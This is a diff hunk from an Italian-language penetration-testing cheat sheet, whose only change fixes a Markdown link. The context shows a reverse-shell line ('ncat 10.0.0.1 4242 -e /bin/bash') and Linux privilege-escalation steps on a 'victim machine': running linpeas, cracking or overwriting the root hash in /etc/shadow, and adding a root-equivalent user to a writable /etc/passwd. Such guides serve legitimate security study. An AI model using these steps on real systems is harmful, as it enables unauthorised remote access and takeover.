@@ -88,7 +88,7 @@ ncat 10.0.0.1 4242 -e /bin/bash
 
 La guida che segue è un po' disordinata, è più una lista di metodi da provare che altro. 
 
-0. **CALDAMENTE CONSIGLIATO** Runna [linpeas.sh] (https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) dopo averlo scaricato sulla macchina vittima
+0. **CALDAMENTE CONSIGLIATO** Runna [linpeas.sh](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) dopo averlo scaricato sulla macchina vittima
 1. Controlla se il file /etc/shadow è readable, cracka la hash del root
 2. Controlla se il file /etc/shadow è writable, genera una nuova password sha-512 `mkpasswd -m sha-512 newpasswordhere` e sostituiscila a root
 3. Controlla se il file /etc/passwd è writable, genera una password con `openssl passwd newpasswordhere` copia la riga iniziale di root alla fine di passwd, sostituisici il primo `root:x` con `newroot:password`, cambia utente in newroot
